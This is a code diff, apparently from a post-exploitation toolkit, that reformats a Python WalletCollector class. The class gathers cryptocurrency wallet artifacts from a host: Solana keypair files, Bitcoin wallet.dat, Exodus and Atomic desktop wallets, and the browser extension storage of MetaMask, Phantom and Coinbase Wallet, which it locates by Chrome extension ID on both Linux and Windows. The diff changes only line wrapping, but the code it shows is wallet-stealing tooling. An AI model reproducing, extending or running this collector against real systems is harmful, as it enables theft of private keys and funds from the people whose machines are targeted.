@@ -1,4 +1,3 @@
-
 from __future__ import annotations
 
 import json
@@ -11,10 +10,11 @@ from forge.utils.post.collectors.filesystem import ArtifactMetadata, BaseCollect
 
 _LOG = logging.getLogger(__name__)
 
+
 class WalletCollector(BaseCollector):
     """
     Collect cryptocurrency wallet artifacts and keypairs.
-    
+
     Targets:
       - ~/.config/solana/id.json
       - ~/.bitcoin/wallet.dat
@@ -66,8 +66,12 @@ class WalletCollector(BaseCollector):
                 )
 
         desktop_wallet_paths = {
-            "desktop_exodus": Path(os.environ.get("APPDATA", "")) / "Exodus" if os.name == "nt" else Path.home() / ".config" / "Exodus",
-            "desktop_atomic": Path(os.environ.get("APPDATA", "")) / "atomic" if os.name == "nt" else Path.home() / ".config" / "atomic",
+            "desktop_exodus": Path(os.environ.get("APPDATA", "")) / "Exodus"
+            if os.name == "nt"
+            else Path.home() / ".config" / "Exodus",
+            "desktop_atomic": Path(os.environ.get("APPDATA", "")) / "atomic"
+            if os.name == "nt"
+            else Path.home() / ".config" / "atomic",
         }
 
         for artifact_subtype, path in desktop_wallet_paths.items():
@@ -109,7 +113,9 @@ class WalletCollector(BaseCollector):
                     "wallet_store": "solana",
                 }
                 try:
-                    artifact.report_safe_summary_fields["keypair_length"] = len(json.loads(data.decode("utf-8")))
+                    artifact.report_safe_summary_fields["keypair_length"] = len(
+                        json.loads(data.decode("utf-8"))
+                    )
                 except (UnicodeDecodeError, json.JSONDecodeError, TypeError):
                     pass
             return self._record_payload(
@@ -130,26 +136,59 @@ class WalletCollector(BaseCollector):
         return (
             (
                 "browser_extension_metamask",
-                Path.home() / ".config" / "google-chrome" / "Default" / "Local Extension Settings" / "nkbihfbeogaeaoehlefnkodbefgpgknn",
+                Path.home()
+                / ".config"
+                / "google-chrome"
+                / "Default"
+                / "Local Extension Settings"
+                / "nkbihfbeogaeaoehlefnkodbefgpgknn",
             ),
             (
                 "browser_extension_metamask",
-                Path(os.environ.get("LOCALAPPDATA", "")) / "Google" / "Chrome" / "User Data" / "Default" / "Local Extension Settings" / "nkbihfbeogaeaoehlefnkodbefgpgknn",
+                Path(os.environ.get("LOCALAPPDATA", ""))
+                / "Google"
+                / "Chrome"
+                / "User Data"
+                / "Default"
+                / "Local Extension Settings"
+                / "nkbihfbeogaeaoehlefnkodbefgpgknn",
             ),
             (
                 "browser_extension_phantom",
-                Path.home() / ".config" / "google-chrome" / "Default" / "Local Extension Settings" / "bfnaelmomeimhlpmgjnjophhpkkoljpa",
+                Path.home()
+                / ".config"
+                / "google-chrome"
+                / "Default"
+                / "Local Extension Settings"
+                / "bfnaelmomeimhlpmgjnjophhpkkoljpa",
             ),
             (
                 "browser_extension_phantom",
-                Path(os.environ.get("LOCALAPPDATA", "")) / "Google" / "Chrome" / "User Data" / "Default" / "Local Extension Settings" / "bfnaelmomeimhlpmgjnjophhpkkoljpa",
+                Path(os.environ.get("LOCALAPPDATA", ""))
+                / "Google"
+                / "Chrome"
+                / "User Data"
+                / "Default"
+                / "Local Extension Settings"
+                / "bfnaelmomeimhlpmgjnjophhpkkoljpa",
             ),
             (
                 "browser_extension_coinbase",
-                Path.home() / ".config" / "google-chrome" / "Default" / "Local Extension Settings" / "hnpfjngllnobngcgfapefoaidbinmjnm",
+                Path.home()
+                / ".config"
+                / "google-chrome"
+                / "Default"
+                / "Local Extension Settings"
+                / "hnpfjngllnobngcgfapefoaidbinmjnm",
             ),
             (
                 "browser_extension_coinbase",
-                Path(os.environ.get("LOCALAPPDATA", "")) / "Google" / "Chrome" / "User Data" / "Default" / "Local Extension Settings" / "hnpfjngllnobngcgfapefoaidbinmjnm",
+                Path(os.environ.get("LOCALAPPDATA", ""))
+                / "Google"
+                / "Chrome"
+                / "User Data"
+                / "Default"
+                / "Local Extension Settings"
+                / "hnpfjngllnobngcgfapefoaidbinmjnm",
             ),
         )
